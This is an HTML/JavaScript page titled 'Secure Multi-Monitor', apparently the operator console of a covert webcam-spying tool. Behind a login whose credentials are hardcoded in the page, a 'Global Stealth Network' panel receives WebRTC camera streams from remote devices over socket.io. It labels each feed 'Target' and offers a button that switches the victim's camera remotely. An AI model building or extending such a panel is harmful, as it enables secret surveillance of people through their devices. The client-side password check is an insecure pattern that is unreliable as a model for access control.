<!DOCTYPE html>
<html>
<head>
    <title>Secure Multi-Monitor</title>
    <style>
        body { background: #111; color: white; font-family: sans-serif; text-align: center; margin: 0; }
        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .monitor-box { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
        .cam-container { width: 320px; background: #000; border-radius: 10px; border: 2px solid #333; padding: 10px; position: relative; }
        video { width: 100%; border-radius: 5px; background: #222; }
        .status-tag { position: absolute; top: 15px; left: 15px; background: rgba(255,0,0,0.7); padding: 2px 8px; border-radius: 4px; font-size: 10px; }
        .user-id { font-size: 12px; color: #f85606; margin-top: 5px; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box" style="background:#222; padding:30px; border-radius:10px; border:1px solid red;">
            <h2>üîí Admin Access</h2>
            <input type="text" id="user" placeholder="Username" style="padding:10px; margin:5px;"><br>
            <input type="password" id="pass" placeholder="Password" style="padding:10px; margin:5px;"><br>
            <button onclick="checkLogin()" style="padding:10px 20px; background:red; color:white; border:none; cursor:pointer;">Login</button>
            <p id="err" style="color:red;"></p>
        </div>
    </div>

    <div id="monitor-ui" style="display:none;">
        <h2>üõ∞Ô∏è Global Stealth Network</h2>
        <div id="remote-videos" class="monitor-box">
            <!-- Ekhane auto video box toiri hobe -->
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const DB_USER = "admin", DB_PASS = "rony25";
        let socket;
        let peers = {}; // Shob connection mone rakhar jonno

        function checkLogin() {
            if (document.getElementById("user").value === DB_USER && document.getElementById("pass").value === DB_PASS) {
                document.getElementById("login-overlay").style.display = "none";
                document.getElementById("monitor-ui").style.display = "block";
                initSocket();
            } else { document.getElementById("err").innerText = "Wrong Login!"; }
        }

        function initSocket() {
            socket = io();

            socket.on("offer-front", async (data) => {
                const { offer, senderId } = data;
                if (!peers[senderId]) createVideoBox(senderId);

                const pc = peers[senderId].pc;
                await pc.setRemoteDescription(new RTCSessionDescription(offer));
                const answer = await pc.createAnswer();
                await pc.setLocalDescription(answer);
                socket.emit("answer-front", { answer, to: senderId });
            });

            socket.on("ice-front", (data) => {
                if (peers[data.senderId]) {
                    peers[data.senderId].pc.addIceCandidate(new RTCIceCandidate(data.candidate));
                }
            });

            socket.on("user-disconnected", (id) => {
                if (peers[id]) {
                    document.getElementById(`container-${id}`).remove();
                    delete peers[id];
                }
            });
        }

        function createVideoBox(id) {
            const container = document.createElement("div");
            container.className = "cam-container";
            container.id = `container-${id}`;
            container.innerHTML = `
                <div class="status-tag">LIVE</div>
                <video id="video-${id}" autoplay playsinline controls></video>
                <div class="user-id">Target: ${id.substring(0, 6)}</div>
                <button onclick="socket.emit('switch-camera', '${id}')" style="font-size:10px; background:#333; color:white; border:none; margin-top:5px; cursor:pointer;">Switch Cam</button>
            `;
            document.getElementById("remote-videos").appendChild(container);

            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.ontrack = (e) => { document.getElementById(`video-${id}`).srcObject = e.streams[0]; };
            
            peers[id] = { pc };
        }
    </script>
</body>
</html>

